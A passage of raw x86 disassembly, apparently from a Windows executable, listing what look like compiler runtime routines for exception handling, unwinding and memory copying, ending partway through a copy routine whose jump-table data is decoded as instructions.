  40298d:	83 79 04 00          	cmpl   $0x0,0x4(%ecx)
  402991:	74 0f                	je     0x4029a2
  402993:	8b 55 fc             	mov    -0x4(%ebp),%edx
  402996:	8b 42 04             	mov    0x4(%edx),%eax
  402999:	50                   	push   %eax
  40299a:	e8 91 0b 00 00       	call   0x403530
  40299f:	83 c4 04             	add    $0x4,%esp
  4029a2:	6a 1b                	push   $0x1b
  4029a4:	e8 67 0b 00 00       	call   0x403510
  4029a9:	83 c4 04             	add    $0x4,%esp
  4029ac:	8b e5                	mov    %ebp,%esp
  4029ae:	5d                   	pop    %ebp
  4029af:	c3                   	ret
  4029b0:	55                   	push   %ebp
  4029b1:	8b ec                	mov    %esp,%ebp
  4029b3:	51                   	push   %ecx
  4029b4:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4029b7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4029ba:	e8 b1 ff ff ff       	call   0x402970
  4029bf:	8b 45 08             	mov    0x8(%ebp),%eax
  4029c2:	83 e0 01             	and    $0x1,%eax
  4029c5:	85 c0                	test   %eax,%eax
  4029c7:	74 0c                	je     0x4029d5
  4029c9:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4029cc:	51                   	push   %ecx
  4029cd:	e8 ae 0c 00 00       	call   0x403680
  4029d2:	83 c4 04             	add    $0x4,%esp
  4029d5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4029d8:	8b e5                	mov    %ebp,%esp
  4029da:	5d                   	pop    %ebp
  4029db:	c2 04 00             	ret    $0x4
  4029de:	cc                   	int3
  4029df:	cc                   	int3
  4029e0:	55                   	push   %ebp
  4029e1:	8b ec                	mov    %esp,%ebp
  4029e3:	51                   	push   %ecx
  4029e4:	53                   	push   %ebx
  4029e5:	56                   	push   %esi
  4029e6:	57                   	push   %edi
  4029e7:	8b 45 0c             	mov    0xc(%ebp),%eax
  4029ea:	83 c0 0c             	add    $0xc,%eax
  4029ed:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4029f0:	64 8b 1d 00 00 00 00 	mov    %fs:0x0,%ebx
  4029f7:	8b 03                	mov    (%ebx),%eax
  4029f9:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4029ff:	8b 45 08             	mov    0x8(%ebp),%eax
  402a02:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  402a05:	8b 63 fc             	mov    -0x4(%ebx),%esp
  402a08:	8b 6d fc             	mov    -0x4(%ebp),%ebp
  402a0b:	ff e0                	jmp    *%eax
  402a0d:	5f                   	pop    %edi
  402a0e:	5e                   	pop    %esi
  402a0f:	5b                   	pop    %ebx
  402a10:	8b e5                	mov    %ebp,%esp
  402a12:	5d                   	pop    %ebp
  402a13:	c2 08 00             	ret    $0x8
  402a16:	cc                   	int3
  402a17:	cc                   	int3
  402a18:	cc                   	int3
  402a19:	cc                   	int3
  402a1a:	cc                   	int3
  402a1b:	cc                   	int3
  402a1c:	cc                   	int3
  402a1d:	cc                   	int3
  402a1e:	cc                   	int3
  402a1f:	cc                   	int3
  402a20:	58                   	pop    %eax
  402a21:	59                   	pop    %ecx
  402a22:	87 04 24             	xchg   %eax,(%esp)
  402a25:	ff e0                	jmp    *%eax
  402a27:	cc                   	int3
  402a28:	cc                   	int3
  402a29:	cc                   	int3
  402a2a:	cc                   	int3
  402a2b:	cc                   	int3
  402a2c:	cc                   	int3
  402a2d:	cc                   	int3
  402a2e:	cc                   	int3
  402a2f:	cc                   	int3
  402a30:	58                   	pop    %eax
  402a31:	59                   	pop    %ecx
  402a32:	87 04 24             	xchg   %eax,(%esp)
  402a35:	ff e0                	jmp    *%eax
  402a37:	cc                   	int3
  402a38:	cc                   	int3
  402a39:	cc                   	int3
  402a3a:	cc                   	int3
  402a3b:	cc                   	int3
  402a3c:	cc                   	int3
  402a3d:	cc                   	int3
  402a3e:	cc                   	int3
  402a3f:	cc                   	int3
  402a40:	55                   	push   %ebp
  402a41:	8b ec                	mov    %esp,%ebp
  402a43:	83 ec 08             	sub    $0x8,%esp
  402a46:	53                   	push   %ebx
  402a47:	56                   	push   %esi
  402a48:	57                   	push   %edi
  402a49:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402a4f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402a52:	c7 45 fc 6c 2a 40 00 	movl   $0x402a6c,-0x4(%ebp)
  402a59:	6a 00                	push   $0x0
  402a5b:	8b 45 0c             	mov    0xc(%ebp),%eax
  402a5e:	50                   	push   %eax
  402a5f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402a62:	51                   	push   %ecx
  402a63:	8b 55 08             	mov    0x8(%ebp),%edx
  402a66:	52                   	push   %edx
  402a67:	e8 06 c1 00 00       	call   0x40eb72
  402a6c:	8b 45 0c             	mov    0xc(%ebp),%eax
  402a6f:	8b 48 04             	mov    0x4(%eax),%ecx
  402a72:	83 e1 fd             	and    $0xfffffffd,%ecx
  402a75:	8b 55 0c             	mov    0xc(%ebp),%edx
  402a78:	89 4a 04             	mov    %ecx,0x4(%edx)
  402a7b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402a81:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  402a84:	89 03                	mov    %eax,(%ebx)
  402a86:	64 89 1d 00 00 00 00 	mov    %ebx,%fs:0x0
  402a8d:	5f                   	pop    %edi
  402a8e:	5e                   	pop    %esi
  402a8f:	5b                   	pop    %ebx
  402a90:	8b e5                	mov    %ebp,%esp
  402a92:	5d                   	pop    %ebp
  402a93:	c2 08 00             	ret    $0x8
  402a96:	cc                   	int3
  402a97:	cc                   	int3
  402a98:	cc                   	int3
  402a99:	cc                   	int3
  402a9a:	cc                   	int3
  402a9b:	cc                   	int3
  402a9c:	cc                   	int3
  402a9d:	cc                   	int3
  402a9e:	cc                   	int3
  402a9f:	cc                   	int3
  402aa0:	55                   	push   %ebp
  402aa1:	8b ec                	mov    %esp,%ebp
  402aa3:	83 ec 08             	sub    $0x8,%esp
  402aa6:	53                   	push   %ebx
  402aa7:	56                   	push   %esi
  402aa8:	57                   	push   %edi
  402aa9:	fc                   	cld
  402aaa:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402aad:	6a 00                	push   $0x0
  402aaf:	6a 00                	push   $0x0
  402ab1:	6a 00                	push   $0x0
  402ab3:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402ab6:	50                   	push   %eax
  402ab7:	8b 4d 14             	mov    0x14(%ebp),%ecx
  402aba:	51                   	push   %ecx
  402abb:	8b 55 10             	mov    0x10(%ebp),%edx
  402abe:	52                   	push   %edx
  402abf:	8b 45 0c             	mov    0xc(%ebp),%eax
  402ac2:	50                   	push   %eax
  402ac3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402ac6:	51                   	push   %ecx
  402ac7:	e8 f4 0c 00 00       	call   0x4037c0
  402acc:	83 c4 20             	add    $0x20,%esp
  402acf:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402ad2:	5f                   	pop    %edi
  402ad3:	5e                   	pop    %esi
  402ad4:	5b                   	pop    %ebx
  402ad5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402ad8:	8b e5                	mov    %ebp,%esp
  402ada:	5d                   	pop    %ebp
  402adb:	c3                   	ret
  402adc:	cc                   	int3
  402add:	cc                   	int3
  402ade:	cc                   	int3
  402adf:	cc                   	int3
  402ae0:	55                   	push   %ebp
  402ae1:	8b ec                	mov    %esp,%ebp
  402ae3:	83 ec 18             	sub    $0x18,%esp
  402ae6:	53                   	push   %ebx
  402ae7:	56                   	push   %esi
  402ae8:	57                   	push   %edi
  402ae9:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  402af0:	c7 45 f0 50 2b 40 00 	movl   $0x402b50,-0x10(%ebp)
  402af7:	8b 45 0c             	mov    0xc(%ebp),%eax
  402afa:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402afd:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402b00:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  402b03:	8b 55 14             	mov    0x14(%ebp),%edx
  402b06:	83 c2 01             	add    $0x1,%edx
  402b09:	89 55 fc             	mov    %edx,-0x4(%ebp)
  402b0c:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402b12:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402b15:	8d 85 ec ff ff ff    	lea    -0x14(%ebp),%eax
  402b1b:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402b21:	8b 45 18             	mov    0x18(%ebp),%eax
  402b24:	50                   	push   %eax
  402b25:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402b28:	51                   	push   %ecx
  402b29:	8b 55 10             	mov    0x10(%ebp),%edx
  402b2c:	52                   	push   %edx
  402b2d:	e8 ee 18 00 00       	call   0x404420
  402b32:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402b35:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402b38:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402b3e:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402b41:	5f                   	pop    %edi
  402b42:	5e                   	pop    %esi
  402b43:	5b                   	pop    %ebx
  402b44:	8b e5                	mov    %ebp,%esp
  402b46:	5d                   	pop    %ebp
  402b47:	c3                   	ret
  402b48:	cc                   	int3
  402b49:	cc                   	int3
  402b4a:	cc                   	int3
  402b4b:	cc                   	int3
  402b4c:	cc                   	int3
  402b4d:	cc                   	int3
  402b4e:	cc                   	int3
  402b4f:	cc                   	int3
  402b50:	55                   	push   %ebp
  402b51:	8b ec                	mov    %esp,%ebp
  402b53:	53                   	push   %ebx
  402b54:	56                   	push   %esi
  402b55:	57                   	push   %edi
  402b56:	fc                   	cld
  402b57:	6a 00                	push   $0x0
  402b59:	8b 45 0c             	mov    0xc(%ebp),%eax
  402b5c:	50                   	push   %eax
  402b5d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402b60:	8b 51 10             	mov    0x10(%ecx),%edx
  402b63:	52                   	push   %edx
  402b64:	8b 45 0c             	mov    0xc(%ebp),%eax
  402b67:	8b 48 08             	mov    0x8(%eax),%ecx
  402b6a:	51                   	push   %ecx
  402b6b:	6a 00                	push   $0x0
  402b6d:	8b 55 10             	mov    0x10(%ebp),%edx
  402b70:	52                   	push   %edx
  402b71:	8b 45 0c             	mov    0xc(%ebp),%eax
  402b74:	8b 48 0c             	mov    0xc(%eax),%ecx
  402b77:	51                   	push   %ecx
  402b78:	8b 55 08             	mov    0x8(%ebp),%edx
  402b7b:	52                   	push   %edx
  402b7c:	e8 3f 0c 00 00       	call   0x4037c0
  402b81:	83 c4 20             	add    $0x20,%esp
  402b84:	5f                   	pop    %edi
  402b85:	5e                   	pop    %esi
  402b86:	5b                   	pop    %ebx
  402b87:	5d                   	pop    %ebp
  402b88:	c3                   	ret
  402b89:	cc                   	int3
  402b8a:	cc                   	int3
  402b8b:	cc                   	int3
  402b8c:	cc                   	int3
  402b8d:	cc                   	int3
  402b8e:	cc                   	int3
  402b8f:	cc                   	int3
  402b90:	55                   	push   %ebp
  402b91:	8b ec                	mov    %esp,%ebp
  402b93:	83 ec 34             	sub    $0x34,%esp
  402b96:	53                   	push   %ebx
  402b97:	56                   	push   %esi
  402b98:	57                   	push   %edi
  402b99:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  402ba0:	c7 45 dc 60 2c 40 00 	movl   $0x402c60,-0x24(%ebp)
  402ba7:	8b 45 18             	mov    0x18(%ebp),%eax
  402baa:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402bad:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402bb0:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  402bb3:	8b 55 1c             	mov    0x1c(%ebp),%edx
  402bb6:	89 55 e8             	mov    %edx,-0x18(%ebp)
  402bb9:	8b 45 20             	mov    0x20(%ebp),%eax
  402bbc:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402bbf:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  402bc6:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  402bcd:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  402bd4:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402bdb:	c7 45 f0 2c 2c 40 00 	movl   $0x402c2c,-0x10(%ebp)
  402be2:	89 65 f4             	mov    %esp,-0xc(%ebp)
  402be5:	89 6d f8             	mov    %ebp,-0x8(%ebp)
  402be8:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402bee:	89 45 d8             	mov    %eax,-0x28(%ebp)
  402bf1:	8d 85 d8 ff ff ff    	lea    -0x28(%ebp),%eax
  402bf7:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402bfd:	c7 45 cc 01 00 00 00 	movl   $0x1,-0x34(%ebp)
  402c04:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402c07:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  402c0a:	8b 55 10             	mov    0x10(%ebp),%edx
  402c0d:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  402c10:	8d 45 d0             	lea    -0x30(%ebp),%eax
  402c13:	50                   	push   %eax
  402c14:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402c17:	8b 11                	mov    (%ecx),%edx
  402c19:	52                   	push   %edx
  402c1a:	e8 01 19 00 00       	call   0x404520
  402c1f:	ff 50 68             	call   *0x68(%eax)
  402c22:	83 c4 08             	add    $0x8,%esp
  402c25:	c7 45 cc 00 00 00 00 	movl   $0x0,-0x34(%ebp)
  402c2c:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  402c30:	74 17                	je     0x402c49
  402c32:	64 8b 1d 00 00 00 00 	mov    %fs:0x0,%ebx
  402c39:	8b 03                	mov    (%ebx),%eax
  402c3b:	8b 5d d8             	mov    -0x28(%ebp),%ebx
  402c3e:	89 03                	mov    %eax,(%ebx)
  402c40:	64 89 1d 00 00 00 00 	mov    %ebx,%fs:0x0
  402c47:	eb 09                	jmp    0x402c52
  402c49:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402c4c:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402c52:	8b 45 cc             	mov    -0x34(%ebp),%eax
  402c55:	5f                   	pop    %edi
  402c56:	5e                   	pop    %esi
  402c57:	5b                   	pop    %ebx
  402c58:	8b e5                	mov    %ebp,%esp
  402c5a:	5d                   	pop    %ebp
  402c5b:	c3                   	ret
  402c5c:	cc                   	int3
  402c5d:	cc                   	int3
  402c5e:	cc                   	int3
  402c5f:	cc                   	int3
  402c60:	55                   	push   %ebp
  402c61:	8b ec                	mov    %esp,%ebp
  402c63:	53                   	push   %ebx
  402c64:	56                   	push   %esi
  402c65:	57                   	push   %edi
  402c66:	fc                   	cld
  402c67:	8b 45 08             	mov    0x8(%ebp),%eax
  402c6a:	8b 48 04             	mov    0x4(%eax),%ecx
  402c6d:	83 e1 66             	and    $0x66,%ecx
  402c70:	85 c9                	test   %ecx,%ecx
  402c72:	74 11                	je     0x402c85
  402c74:	8b 55 0c             	mov    0xc(%ebp),%edx
  402c77:	c7 42 24 01 00 00 00 	movl   $0x1,0x24(%edx)
  402c7e:	b8 01 00 00 00       	mov    $0x1,%eax
  402c83:	eb 57                	jmp    0x402cdc
  402c85:	6a 01                	push   $0x1
  402c87:	8b 45 0c             	mov    0xc(%ebp),%eax
  402c8a:	8b 48 14             	mov    0x14(%eax),%ecx
  402c8d:	51                   	push   %ecx
  402c8e:	8b 55 0c             	mov    0xc(%ebp),%edx
  402c91:	8b 42 10             	mov    0x10(%edx),%eax
  402c94:	50                   	push   %eax
  402c95:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402c98:	8b 51 08             	mov    0x8(%ecx),%edx
  402c9b:	52                   	push   %edx
  402c9c:	6a 00                	push   $0x0
  402c9e:	8b 45 10             	mov    0x10(%ebp),%eax
  402ca1:	50                   	push   %eax
  402ca2:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402ca5:	8b 51 0c             	mov    0xc(%ecx),%edx
  402ca8:	52                   	push   %edx
  402ca9:	8b 45 08             	mov    0x8(%ebp),%eax
  402cac:	50                   	push   %eax
  402cad:	e8 0e 0b 00 00       	call   0x4037c0
  402cb2:	83 c4 20             	add    $0x20,%esp
  402cb5:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402cb8:	83 79 24 00          	cmpl   $0x0,0x24(%ecx)
  402cbc:	75 0d                	jne    0x402ccb
  402cbe:	8b 55 08             	mov    0x8(%ebp),%edx
  402cc1:	52                   	push   %edx
  402cc2:	8b 45 0c             	mov    0xc(%ebp),%eax
  402cc5:	50                   	push   %eax
  402cc6:	e8 75 fd ff ff       	call   0x402a40
  402ccb:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  402cce:	8b 63 1c             	mov    0x1c(%ebx),%esp
  402cd1:	8b 6b 20             	mov    0x20(%ebx),%ebp
  402cd4:	ff 63 18             	jmp    *0x18(%ebx)
  402cd7:	b8 01 00 00 00       	mov    $0x1,%eax
  402cdc:	5f                   	pop    %edi
  402cdd:	5e                   	pop    %esi
  402cde:	5b                   	pop    %ebx
  402cdf:	5d                   	pop    %ebp
  402ce0:	c3                   	ret
  402ce1:	cc                   	int3
  402ce2:	cc                   	int3
  402ce3:	cc                   	int3
  402ce4:	cc                   	int3
  402ce5:	cc                   	int3
  402ce6:	cc                   	int3
  402ce7:	cc                   	int3
  402ce8:	cc                   	int3
  402ce9:	cc                   	int3
  402cea:	cc                   	int3
  402ceb:	cc                   	int3
  402cec:	cc                   	int3
  402ced:	cc                   	int3
  402cee:	cc                   	int3
  402cef:	cc                   	int3
  402cf0:	55                   	push   %ebp
  402cf1:	8b ec                	mov    %esp,%ebp
  402cf3:	51                   	push   %ecx
  402cf4:	8b 45 08             	mov    0x8(%ebp),%eax
  402cf7:	53                   	push   %ebx
  402cf8:	56                   	push   %esi
  402cf9:	57                   	push   %edi
  402cfa:	8b 48 10             	mov    0x10(%eax),%ecx
  402cfd:	8b 70 0c             	mov    0xc(%eax),%esi
  402d00:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  402d03:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402d06:	85 c9                	test   %ecx,%ecx
  402d08:	8b fe                	mov    %esi,%edi
  402d0a:	8b de                	mov    %esi,%ebx
  402d0c:	7c 3b                	jl     0x402d49
  402d0e:	83 fe ff             	cmp    $0xffffffff,%esi
  402d11:	75 05                	jne    0x402d18
  402d13:	e8 38 19 00 00       	call   0x404650
  402d18:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402d1b:	4e                   	dec    %esi
  402d1c:	8b 4d 10             	mov    0x10(%ebp),%ecx
  402d1f:	8d 14 b6             	lea    (%esi,%esi,4),%edx
  402d22:	8d 04 90             	lea    (%eax,%edx,4),%eax
  402d25:	39 48 04             	cmp    %ecx,0x4(%eax)
  402d28:	7d 05                	jge    0x402d2f
  402d2a:	3b 48 08             	cmp    0x8(%eax),%ecx
  402d2d:	7e 05                	jle    0x402d34
  402d2f:	83 fe ff             	cmp    $0xffffffff,%esi
  402d32:	75 0b                	jne    0x402d3f
  402d34:	8b 45 0c             	mov    0xc(%ebp),%eax
  402d37:	8b fb                	mov    %ebx,%edi
  402d39:	48                   	dec    %eax
  402d3a:	8b de                	mov    %esi,%ebx
  402d3c:	89 45 0c             	mov    %eax,0xc(%ebp)
  402d3f:	8b 45 0c             	mov    0xc(%ebp),%eax
  402d42:	85 c0                	test   %eax,%eax
  402d44:	7d c8                	jge    0x402d0e
  402d46:	8b 45 08             	mov    0x8(%ebp),%eax
  402d49:	8b 4d 14             	mov    0x14(%ebp),%ecx
  402d4c:	8b 55 18             	mov    0x18(%ebp),%edx
  402d4f:	46                   	inc    %esi
  402d50:	89 31                	mov    %esi,(%ecx)
  402d52:	89 3a                	mov    %edi,(%edx)
  402d54:	3b 78 0c             	cmp    0xc(%eax),%edi
  402d57:	77 04                	ja     0x402d5d
  402d59:	3b f7                	cmp    %edi,%esi
  402d5b:	76 05                	jbe    0x402d62
  402d5d:	e8 ee 18 00 00       	call   0x404650
  402d62:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402d65:	8d 04 b6             	lea    (%esi,%esi,4),%eax
  402d68:	5f                   	pop    %edi
  402d69:	5e                   	pop    %esi
  402d6a:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  402d6d:	5b                   	pop    %ebx
  402d6e:	8b e5                	mov    %ebp,%esp
  402d70:	5d                   	pop    %ebp
  402d71:	c3                   	ret
  402d72:	90                   	nop
  402d73:	90                   	nop
  402d74:	90                   	nop
  402d75:	90                   	nop
  402d76:	90                   	nop
  402d77:	90                   	nop
  402d78:	90                   	nop
  402d79:	90                   	nop
  402d7a:	90                   	nop
  402d7b:	90                   	nop
  402d7c:	90                   	nop
  402d7d:	90                   	nop
  402d7e:	90                   	nop
  402d7f:	90                   	nop
  402d80:	55                   	push   %ebp
  402d81:	8b ec                	mov    %esp,%ebp
  402d83:	53                   	push   %ebx
  402d84:	56                   	push   %esi
  402d85:	57                   	push   %edi
  402d86:	55                   	push   %ebp
  402d87:	6a 00                	push   $0x0
  402d89:	6a 00                	push   $0x0
  402d8b:	68 98 2d 40 00       	push   $0x402d98
  402d90:	ff 75 08             	push   0x8(%ebp)
  402d93:	e8 da bd 00 00       	call   0x40eb72
  402d98:	5d                   	pop    %ebp
  402d99:	5f                   	pop    %edi
  402d9a:	5e                   	pop    %esi
  402d9b:	5b                   	pop    %ebx
  402d9c:	8b e5                	mov    %ebp,%esp
  402d9e:	5d                   	pop    %ebp
  402d9f:	c3                   	ret
  402da0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  402da4:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
  402dab:	b8 01 00 00 00       	mov    $0x1,%eax
  402db0:	74 0f                	je     0x402dc1
  402db2:	8b 44 24 08          	mov    0x8(%esp),%eax
  402db6:	8b 54 24 10          	mov    0x10(%esp),%edx
  402dba:	89 02                	mov    %eax,(%edx)
  402dbc:	b8 03 00 00 00       	mov    $0x3,%eax
  402dc1:	c3                   	ret
  402dc2:	53                   	push   %ebx
  402dc3:	56                   	push   %esi
  402dc4:	57                   	push   %edi
  402dc5:	8b 44 24 10          	mov    0x10(%esp),%eax
  402dc9:	50                   	push   %eax
  402dca:	6a fe                	push   $0xfffffffe
  402dcc:	68 a0 2d 40 00       	push   $0x402da0
  402dd1:	64 ff 35 00 00 00 00 	push   %fs:0x0
  402dd8:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402ddf:	8b 44 24 20          	mov    0x20(%esp),%eax
  402de3:	8b 58 08             	mov    0x8(%eax),%ebx
  402de6:	8b 70 0c             	mov    0xc(%eax),%esi
  402de9:	83 fe ff             	cmp    $0xffffffff,%esi
  402dec:	74 2e                	je     0x402e1c
  402dee:	3b 74 24 24          	cmp    0x24(%esp),%esi
  402df2:	74 28                	je     0x402e1c
  402df4:	8d 34 76             	lea    (%esi,%esi,2),%esi
  402df7:	8b 0c b3             	mov    (%ebx,%esi,4),%ecx
  402dfa:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  402dfe:	89 48 0c             	mov    %ecx,0xc(%eax)
  402e01:	83 7c b3 04 00       	cmpl   $0x0,0x4(%ebx,%esi,4)
  402e06:	75 12                	jne    0x402e1a
  402e08:	68 01 01 00 00       	push   $0x101
  402e0d:	8b 44 b3 08          	mov    0x8(%ebx,%esi,4),%eax
  402e11:	e8 40 00 00 00       	call   0x402e56
  402e16:	ff 54 b3 08          	call   *0x8(%ebx,%esi,4)
  402e1a:	eb c3                	jmp    0x402ddf
  402e1c:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  402e23:	83 c4 0c             	add    $0xc,%esp
  402e26:	5f                   	pop    %edi
  402e27:	5e                   	pop    %esi
  402e28:	5b                   	pop    %ebx
  402e29:	c3                   	ret
  402e2a:	33 c0                	xor    %eax,%eax
  402e2c:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
  402e33:	81 79 04 a0 2d 40 00 	cmpl   $0x402da0,0x4(%ecx)
  402e3a:	75 10                	jne    0x402e4c
  402e3c:	8b 51 0c             	mov    0xc(%ecx),%edx
  402e3f:	8b 52 0c             	mov    0xc(%edx),%edx
  402e42:	39 51 08             	cmp    %edx,0x8(%ecx)
  402e45:	75 05                	jne    0x402e4c
  402e47:	b8 01 00 00 00       	mov    $0x1,%eax
  402e4c:	c3                   	ret
  402e4d:	53                   	push   %ebx
  402e4e:	51                   	push   %ecx
  402e4f:	bb 48 af 45 00       	mov    $0x45af48,%ebx
  402e54:	eb 0a                	jmp    0x402e60
  402e56:	53                   	push   %ebx
  402e57:	51                   	push   %ecx
  402e58:	bb 48 af 45 00       	mov    $0x45af48,%ebx
  402e5d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402e60:	89 4b 08             	mov    %ecx,0x8(%ebx)
  402e63:	89 43 04             	mov    %eax,0x4(%ebx)
  402e66:	89 6b 0c             	mov    %ebp,0xc(%ebx)
  402e69:	59                   	pop    %ecx
  402e6a:	5b                   	pop    %ebx
  402e6b:	c2 04 00             	ret    $0x4
  402e6e:	cc                   	int3
  402e6f:	cc                   	int3
  402e70:	55                   	push   %ebp
  402e71:	8b ec                	mov    %esp,%ebp
  402e73:	83 ec 20             	sub    $0x20,%esp
  402e76:	56                   	push   %esi
  402e77:	57                   	push   %edi
  402e78:	b9 08 00 00 00       	mov    $0x8,%ecx
  402e7d:	be 08 f1 40 00       	mov    $0x40f108,%esi
  402e82:	8d 7d e0             	lea    -0x20(%ebp),%edi
  402e85:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402e87:	8b 45 08             	mov    0x8(%ebp),%eax
  402e8a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402e8d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402e90:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  402e93:	8d 55 f4             	lea    -0xc(%ebp),%edx
  402e96:	52                   	push   %edx
  402e97:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402e9a:	50                   	push   %eax
  402e9b:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  402e9e:	51                   	push   %ecx
  402e9f:	8b 55 e0             	mov    -0x20(%ebp),%edx
  402ea2:	52                   	push   %edx
  402ea3:	ff 15 18 f0 40 00    	call   *0x40f018
  402ea9:	5f                   	pop    %edi
  402eaa:	5e                   	pop    %esi
  402eab:	8b e5                	mov    %ebp,%esp
  402ead:	5d                   	pop    %ebp
  402eae:	c2 08 00             	ret    $0x8
  402eb1:	cc                   	int3
  402eb2:	cc                   	int3
  402eb3:	cc                   	int3
  402eb4:	cc                   	int3
  402eb5:	cc                   	int3
  402eb6:	cc                   	int3
  402eb7:	cc                   	int3
  402eb8:	cc                   	int3
  402eb9:	cc                   	int3
  402eba:	cc                   	int3
  402ebb:	cc                   	int3
  402ebc:	cc                   	int3
  402ebd:	cc                   	int3
  402ebe:	cc                   	int3
  402ebf:	cc                   	int3
  402ec0:	55                   	push   %ebp
  402ec1:	8b ec                	mov    %esp,%ebp
  402ec3:	57                   	push   %edi
  402ec4:	56                   	push   %esi
  402ec5:	8b 75 0c             	mov    0xc(%ebp),%esi
  402ec8:	8b 4d 10             	mov    0x10(%ebp),%ecx
  402ecb:	8b 7d 08             	mov    0x8(%ebp),%edi
  402ece:	8b c1                	mov    %ecx,%eax
  402ed0:	8b d1                	mov    %ecx,%edx
  402ed2:	03 c6                	add    %esi,%eax
  402ed4:	3b fe                	cmp    %esi,%edi
  402ed6:	76 08                	jbe    0x402ee0
  402ed8:	3b f8                	cmp    %eax,%edi
  402eda:	0f 82 78 01 00 00    	jb     0x403058
  402ee0:	f7 c7 03 00 00 00    	test   $0x3,%edi
  402ee6:	75 14                	jne    0x402efc
  402ee8:	c1 e9 02             	shr    $0x2,%ecx
  402eeb:	83 e2 03             	and    $0x3,%edx
  402eee:	83 f9 08             	cmp    $0x8,%ecx
  402ef1:	72 29                	jb     0x402f1c
  402ef3:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402ef5:	ff 24 95 08 30 40 00 	jmp    *0x403008(,%edx,4)
  402efc:	8b c7                	mov    %edi,%eax
  402efe:	ba 03 00 00 00       	mov    $0x3,%edx
  402f03:	83 e9 04             	sub    $0x4,%ecx
  402f06:	72 0c                	jb     0x402f14
  402f08:	83 e0 03             	and    $0x3,%eax
  402f0b:	03 c8                	add    %eax,%ecx
  402f0d:	ff 24 85 20 2f 40 00 	jmp    *0x402f20(,%eax,4)
  402f14:	ff 24 8d 18 30 40 00 	jmp    *0x403018(,%ecx,4)
  402f1b:	90                   	nop
  402f1c:	ff 24 8d 9c 2f 40 00 	jmp    *0x402f9c(,%ecx,4)
  402f23:	90                   	nop
  402f24:	30 2f                	xor    %ch,(%edi)
  402f26:	40                   	inc    %eax
  402f27:	00 5c 2f 40          	add    %bl,0x40(%edi,%ebp,1)
  402f2b:	00 80 2f 40 00 23    	add    %al,0x2300402f(%eax)
  402f31:	d1 8a 06 88 07 8a    	rorl   $1,-0x75f877fa(%edx)
  402f37:	46                   	inc    %esi
  402f38:	01 88 47 01 8a 46    	add    %ecx,0x468a0147(%eax)
  402f3e:	02 c1                	add    %cl,%al
  402f40:	e9 02 88 47 02       	jmp    0x287b747
  402f45:	83 c6 03             	add    $0x3,%esi
  402f48:	83 c7 03             	add    $0x3,%edi
  402f4b:	83 f9 08             	cmp    $0x8,%ecx
  402f4e:	72 cc                	jb     0x402f1c
